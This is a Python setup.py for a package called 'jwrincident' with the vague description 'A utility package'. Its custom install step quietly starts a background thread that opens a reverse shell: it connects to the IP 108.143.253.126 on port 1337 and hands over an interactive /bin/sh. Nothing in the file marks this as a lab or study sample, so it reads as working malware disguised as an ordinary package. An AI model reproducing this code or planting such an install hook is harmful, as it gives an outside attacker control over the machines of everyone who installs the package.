from setuptools import setup
from setuptools.command.install import install
import os, threading

class PostInstall(install):
    def run(self):
        def cb():
            os.system("python3 -c 'import socket,subprocess,os;s=socket.socket();s.connect((\"108.143.253.126\",1337));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call([\"/bin/sh\",\"-i\"])'")
        t = threading.Thread(target=cb, daemon=True)
        t.start()
        install.run(self)

setup(
    name="jwrincident",
    version="1.0.0",
    description="A utility package",
    author="You",
    cmdclass={"install": PostInstall},
    py_modules=["dummy"],
)
